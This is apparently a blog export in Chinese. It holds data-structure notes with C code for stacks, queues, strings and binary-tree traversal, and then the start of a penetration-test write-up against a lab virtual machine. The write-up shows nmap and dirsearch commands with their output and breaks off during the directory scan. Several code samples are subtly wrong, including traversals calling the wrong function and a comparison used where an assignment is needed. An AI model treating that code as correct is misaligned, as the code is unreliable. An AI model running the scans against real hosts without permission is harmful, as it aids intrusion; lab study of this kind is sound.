<h3 id="进栈操作"><a href="#进栈操作" class="headerlink" title="进栈操作"></a>进栈操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data[MaxSize];</span><br><span class="line">	<span class="type">int</span> top;</span><br><span class="line">&#125;SqStack;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">Push</span><span class="params">(SqStack &amp;S ,<span class="type">int</span> x)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(S.top==MaxSize<span class="number">-1</span>)&#123;   <span class="comment">//栈满 </span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	S.top=S.top+<span class="number">1</span>;          <span class="comment">//栈顶指针加一 </span></span><br><span class="line">	S.data[S.top]=x;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="出栈操作"><a href="#出栈操作" class="headerlink" title="出栈操作"></a>出栈操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data[MaxSize];</span><br><span class="line">	<span class="type">int</span> top;</span><br><span class="line">&#125;SqStack;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">Pop</span><span class="params">(SqStack &amp;S, <span class="type">int</span> &amp;x)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(S.top==<span class="number">-1</span>)&#123;     <span class="comment">//栈空</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	x=S.data[S.top];</span><br><span class="line">	S.top=S.top<span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="读取栈顶元素"><a href="#读取栈顶元素" class="headerlink" title="读取栈顶元素"></a>读取栈顶元素</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data[MaxSize];</span><br><span class="line">	<span class="type">int</span> top;</span><br><span class="line">&#125;SqStack;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">GetTop</span><span class="params">(SqStack &amp;S, <span class="type">int</span> &amp;x)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(S.top==<span class="number">-1</span>)&#123;     <span class="comment">//栈空</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	x=S.data[S.top];</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="链栈"><a href="#链栈" class="headerlink" title="链栈"></a>链栈</h2><h3 id="栈的定义-1"><a href="#栈的定义-1" class="headerlink" title="栈的定义"></a>栈的定义</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">StackNode</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">StackNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;StackNode,*LinkStack;</span><br></pre></td></tr></table></figure>

<h3 id="进栈操作-1"><a href="#进栈操作-1" class="headerlink" title="进栈操作"></a>进栈操作</h3><p>带头结点</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">StackNode</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">StackNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;StackNode,*LinkStack;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">Push</span><span class="params">(LiStack *S, <span class="type">int</span> x)</span>&#123;</span><br><span class="line">	StackNode *p=(StackNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(StackNode));</span><br><span class="line">	<span class="keyword">if</span>(p==<span class="literal">NULL</span>)&#123;        <span class="comment">//内存分配失败 </span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	p-&gt;data=x;</span><br><span class="line">	p-&gt;next=S-&gt;next;</span><br><span class="line">	S=p;                <span class="comment">//修改栈顶指针 </span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="出栈操作-1"><a href="#出栈操作-1" class="headerlink" title="出栈操作"></a>出栈操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">StackNode</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">StackNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;StackNode,*LinkStack;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">Pop</span><span class="params">(LinkStack &amp;S, <span class="type">int</span> &amp;x)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(S==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	StackNode *p=(StackNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(StackNode));</span><br><span class="line">	x=S-&gt;data;</span><br><span class="line">	p=S;          <span class="comment">//暂时保存被删除的栈顶元素 </span></span><br><span class="line">	S=S-&gt;next;</span><br><span class="line">	<span class="built_in">free</span>(p);	  <span class="comment">//释放内存 </span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h1 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h1><h2 id="顺序队列（循环队列）"><a href="#顺序队列（循环队列）" class="headerlink" title="顺序队列（循环队列）"></a>顺序队列（循环队列）</h2><h3 id="队列的定义"><a href="#队列的定义" class="headerlink" title="队列的定义"></a>队列的定义</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data[MaxSize];</span><br><span class="line">	<span class="type">int</span> front,rear;      <span class="comment">//队头指针和队尾指针 </span></span><br><span class="line">&#125;SqQueue;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">(SqQueue &amp;Q)</span>&#123;</span><br><span class="line">	<span class="comment">//初始时，队头队尾指针都指向0</span></span><br><span class="line">	Q.front=Q.rear=<span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	SqQueue Q;</span><br><span class="line">	InitQueue(Q);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="判断队列是否为空"><a href="#判断队列是否为空" class="headerlink" title="判断队列是否为空"></a>判断队列是否为空</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">QueueEmpty</span><span class="params">(SqQueue Q)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.rear==Q.front)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="入队操作"><a href="#入队操作" class="headerlink" title="入队操作"></a>入队操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data[MaxSize];</span><br><span class="line">	<span class="type">int</span> front,rear;      <span class="comment">//队头指针和队尾指针 </span></span><br><span class="line">&#125;SqQueue;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">EnQueue</span><span class="params">(SqQueue &amp;Q, <span class="type">int</span> x)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>((Q.rear+<span class="number">1</span>)%MaxSize==Q.front)&#123;  <span class="comment">//队列已满 </span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">	&#125;</span><br><span class="line">	Q.data[Q.rear]=x;</span><br><span class="line">	Q.rear=(Q.rear+<span class="number">1</span>)%MaxSize;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="出队操作"><a href="#出队操作" class="headerlink" title="出队操作"></a>出队操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data[MaxSize];</span><br><span class="line">	<span class="type">int</span> front,rear;      <span class="comment">//队头指针和队尾指针 </span></span><br><span class="line">&#125;SqQueue;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">DeQueue</span><span class="params">(SqQueue &amp;Q, <span class="type">int</span> x)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(Q.rear==Q.front)&#123;  <span class="comment">//队空报错 </span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">	&#125;</span><br><span class="line">	x=Q.data[Q.front];</span><br><span class="line">	Q.front=(Q.front+<span class="number">1</span>)%MaxSize;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="链式队列"><a href="#链式队列" class="headerlink" title="链式队列"></a>链式队列</h2><h3 id="队列的定义-1"><a href="#队列的定义-1" class="headerlink" title="队列的定义"></a>队列的定义</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LinkNode;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	LinkNode *front,*rear;</span><br><span class="line">&#125;LinkQueue;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">(LinkQueue &amp;Q)</span>&#123;</span><br><span class="line">	Q.front=Q.rear=(LinkNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkNode));</span><br><span class="line">	Q.front-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="判断队列是否为空-1"><a href="#判断队列是否为空-1" class="headerlink" title="判断队列是否为空"></a>判断队列是否为空</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">IsEmpty</span><span class="params">(LinkQueue Q)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(Q.front==Q.rear)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="入队操作-1"><a href="#入队操作-1" class="headerlink" title="入队操作"></a>入队操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">EnQueue</span><span class="params">(LinkQueue &amp;Q, <span class="type">int</span> x)</span>&#123;</span><br><span class="line">	LinkNode *s=(LinkNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkNode));</span><br><span class="line">	s-&gt;data=x;</span><br><span class="line">	s-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">	Q.rear-&gt;next=s;</span><br><span class="line">	Q.rear=s;       <span class="comment">//修改尾指针 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="出队操作-1"><a href="#出队操作-1" class="headerlink" title="出队操作"></a>出队操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DeQueue</span><span class="params">(LinkQueue &amp;Q, <span class="type">int</span> &amp;x)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(Q.front==Q.rear)&#123;  <span class="comment">//队空 </span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125; </span><br><span class="line">	LinkNode *p=Q.front-&gt;next;</span><br><span class="line">	x=p-&gt;data;</span><br><span class="line">	Q.rear-&gt;next=p-&gt;next;</span><br><span class="line">	<span class="keyword">if</span>(Q.rear==p)&#123;</span><br><span class="line">		Q.rear==Q.front;  <span class="comment">//原队列只有一个结点，删除后变空 </span></span><br><span class="line">	&#125; </span><br><span class="line">	<span class="built_in">free</span>(p);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="串"><a href="#串" class="headerlink" title="串"></a>串</h1><h2 id="顺序串"><a href="#顺序串" class="headerlink" title="顺序串"></a>顺序串</h2><h3 id="串的定义"><a href="#串的定义" class="headerlink" title="串的定义"></a>串的定义</h3><h4 id="静态数组"><a href="#静态数组" class="headerlink" title="静态数组"></a>静态数组</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXLEN 255</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> ch[MAXLEN];</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line">&#125;SString;</span><br></pre></td></tr></table></figure>

<h4 id="动态数组-堆分配存储"><a href="#动态数组-堆分配存储" class="headerlink" title="动态数组(堆分配存储)"></a>动态数组(堆分配存储)</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *ch;</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line">&#125;HString;</span><br><span class="line"></span><br><span class="line">HString S;</span><br><span class="line">S.ch=(<span class="type">char</span>*)<span class="built_in">malloc</span>(MAXLEN*<span class="keyword">sizeof</span>(<span class="type">char</span>));  <span class="comment">//需要手动free</span></span><br><span class="line">S.length;</span><br></pre></td></tr></table></figure>

<h3 id="求子串"><a href="#求子串" class="headerlink" title="求子串"></a>求子串</h3><p>返回第pos个字符起，长度为len的子串</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXLEN 255</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> ch[MAXLEN];</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line">&#125;SString;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">SubString</span><span class="params">(SString &amp;Sub, SString S, <span class="type">int</span> pos, <span class="type">int</span> len)</span>&#123;</span><br><span class="line">	<span class="comment">//字串范围越界判断</span></span><br><span class="line">	<span class="keyword">if</span>(pos+len<span class="number">-1</span> &gt; S.length)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=pos;i&lt;pos+len;i++)&#123;</span><br><span class="line">		Sub.ch[i-pos+<span class="number">1</span>]=S.ch[i];</span><br><span class="line">	&#125;</span><br><span class="line">	Sub.length=len;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="比较操作"><a href="#比较操作" class="headerlink" title="比较操作"></a>比较操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">StrCompare</span><span class="params">(SString S, SString T)</span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;S.length &amp;&amp; i&lt;T.length; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(S.ch[i]!=T.ch[i])&#123;</span><br><span class="line">			<span class="keyword">return</span> S.ch[i]-T.ch[i];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> S.length-T.length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="定位操作"><a href="#定位操作" class="headerlink" title="定位操作"></a>定位操作</h3><p>若主串S中存在与串T值相同的子串，返回在S串中第一次出现位置</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Index</span><span class="params">(SString S, SString T)</span>&#123;</span><br><span class="line">	<span class="type">int</span> i=<span class="number">1</span>, n=StrLength(S),m=StrLength(T);</span><br><span class="line">	SString sub;    <span class="comment">//用于暂存子串</span></span><br><span class="line">	<span class="keyword">while</span>(i&lt;n-m+<span class="number">1</span>)&#123;</span><br><span class="line">		SubString(sub,S,i,m);</span><br><span class="line">		<span class="keyword">if</span>(StrCompare(sub,T)!=<span class="number">0</span>)&#123;</span><br><span class="line">			++i;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="链串"><a href="#链串" class="headerlink" title="链串"></a>链串</h2><h3 id="串的定义-1"><a href="#串的定义-1" class="headerlink" title="串的定义"></a>串的定义</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">StringNode</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> ch;   <span class="comment">//结点可存放多个字符，如ch[4]</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">StringNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;StringNode,*String;</span><br></pre></td></tr></table></figure>

<h1 id="树"><a href="#树" class="headerlink" title="树"></a>树</h1><h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><h3 id="树的定义"><a href="#树的定义" class="headerlink" title="树的定义"></a>树的定义</h3><h4 id="顺序二叉树"><a href="#顺序二叉树" class="headerlink" title="顺序二叉树"></a>顺序二叉树</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 100</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> value;     <span class="comment">//结点数据元素</span></span><br><span class="line">    <span class="type">bool</span> isEmpty;  <span class="comment">//结点是否为空</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">TreeNode t[MaxSize];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;MaxSize; i++)&#123;</span><br><span class="line">   t[i].isEmpty=<span class="literal">true</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="链式二叉树"><a href="#链式二叉树" class="headerlink" title="链式二叉树"></a>链式二叉树</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span></span><br><span class="line">    <span class="comment">//有需求找父节点可添加指针</span></span><br><span class="line">    <span class="comment">//struct BiTNode *parent;</span></span><br><span class="line">&#125;BiTNode,*BiTree;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一棵空树</span></span><br><span class="line">BiTree root=<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入根结点</span></span><br><span class="line">root=(BiTree*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BiTNode));</span><br><span class="line">root-&gt;data=&#123;<span class="number">1</span>&#125;;</span><br><span class="line">root-&gt;lchild=<span class="literal">NULL</span>;</span><br><span class="line">root-&gt;rchild=<span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<h3 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h3><h4 id="先序遍历"><a href="#先序遍历" class="headerlink" title="先序遍历"></a>先序遍历</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PreOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(T!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">		visit(T);</span><br><span class="line">		PreOrder(T-&gt;lchild);</span><br><span class="line">		PreOrder(T-&gt;rchild);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(T!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">		PreOrder(T-&gt;lchild);</span><br><span class="line">        visit(T);</span><br><span class="line">		PreOrder(T-&gt;rchild);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(T!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">		PreOrder(T-&gt;lchild);</span><br><span class="line">		PreOrder(T-&gt;rchild);</span><br><span class="line">        visit(T);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="层次遍历"><a href="#层次遍历" class="headerlink" title="层次遍历"></a>层次遍历</h4><p>算法思想：</p>
<ol>
<li>初始化一个辅助队列</li>
<li>根节点入队</li>
<li>若队列非空，则队头结点出队，访问该结点，并将其左右孩子插入队尾（如果有的话）</li>
<li>重复3步骤，直至队列为空</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">LevelOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">	LinkQueue Q;</span><br><span class="line">	InitQueue(Q);     </span><br><span class="line">	BiTree p;		 </span><br><span class="line">	EnQueue(Q,T);   <span class="comment">//将根结点入队</span></span><br><span class="line">	<span class="keyword">while</span>(!IsEmpty(Q))&#123; </span><br><span class="line">		DeQueue(Q, p);</span><br><span class="line">		visit(p);</span><br><span class="line">		<span class="keyword">if</span>(p-&gt;lchild!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">			EnQueue(Q,p-&gt;lchild);</span><br><span class="line">		&#125; </span><br><span class="line">		<span class="keyword">if</span>(p-&gt;rchild!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">			EnQueue(Q,p-&gt;rchild);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="求树的深度"><a href="#求树的深度" class="headerlink" title="求树的深度"></a>求树的深度</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">treeDepth</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(T==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="type">int</span> l=treeDepth(T-&gt;lchild);</span><br><span class="line">		<span class="type">int</span> r=treeDepth(T-&gt;rchild);</span><br><span class="line">		<span class="keyword">return</span> l&gt;r ? l+<span class="number">1</span> : r+<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>























]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
  </entry>
  <entry>
    <title>记录渗透某远古网站</title>
    <url>/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99.html</url>
    <content><![CDATA[<p>网站来源是从大陆对面扒下来的，应该是十年前的所以比较老。但是也算是一次比较系统的渗透测试，非常适合初学者。</p>
<span id="more"></span>

<h1 id="记录渗透某远古网站"><a href="#记录渗透某远古网站" class="headerlink" title="记录渗透某远古网站"></a>记录渗透某远古网站</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>攻击机：kali2023</p>
<p>靶机：ubuntu</p>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap扫下端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sS -sV -v --min-rate=10000 -p1-10000 192.168.132.140</span><br></pre></td></tr></table></figure>

<p>扫描结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.2.22 ((Ubuntu))</span><br><span class="line">8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1</span><br></pre></td></tr></table></figure>

<p>开放了80端口，访问一下发现是某文创园的主页</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241018092736141.png"></p>
<p>网站的8080端口是tomcat中间件，访问可以看到tomcat搭建成功</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241018092829787.png"></p>
<p>扫下目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.132.140/ -i 200,301</span><br></pre></td></tr></table></figure>

<p>发现泄露了很多路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Target: http://192.168.132.140/</span><br><span class="line"></span><br><span class="line">[12:34:35] Starting:                                                                                                                        </span><br><span class="line">[12:34:35] 301 -  246B  - /js  -&gt;  http://192.168.132.140/js/               </span><br><span class="line">[12:34:47] 200 -    2KB - /ajax                                             </span><br><span class="line">[12:34:49] 301 -  248B  - /back  -&gt;  http://192.168.132.140/back/           </span><br><span class="line">[12:34:50] 200 -    4KB - /cal                                              </span><br><span class="line">[12:34:51] 301 -  250B  - /classes  -&gt;  http://192.168.132.140/classes/     </span><br><span class="line">[12:34:51] 200 -  603B  - /classes/                                         </span><br><span class="line">[12:34:51] 301 -  250B  - /config  -&gt;  http://192.168.132.140/config/       </span><br><span class="line">[12:34:52] 200 -  586B  - /config/                                          </span><br><span class="line">[12:34:54] 200 -    2KB - /download/                                        </span><br><span class="line">[12:34:54] 301 -  251B  - /download  -&gt;  http://192.168.132.140/download/   </span><br><span class="line">[12:34:55] 301 -  246B  - /en  -&gt;  http://192.168.132.140/en/               </span><br><span class="line">[12:34:56] 200 -    1KB - /favicon.ico                                      </span><br><span class="line">[12:34:56] 200 -  882B  - /footer.php                                       </span><br><span class="line">[12:34:56] 200 -  882B  - /footer                                           </span><br><span class="line">[12:34:58] 200 -  851B  - /header                                           </span><br><span class="line">[12:34:58] 200 -  851B  - /header.php                                       </span><br><span class="line">[12:34:58] 301 -  248B  - /htdocs  -&gt;  http://192.168.132.140/htdocs/       </span><br><span class="line">[12:34:58] 301 -  250B  - /images  -&gt;  http://192.168.132.140/images/       </span><br><span class="line">[12:34:58] 200 -    6KB - 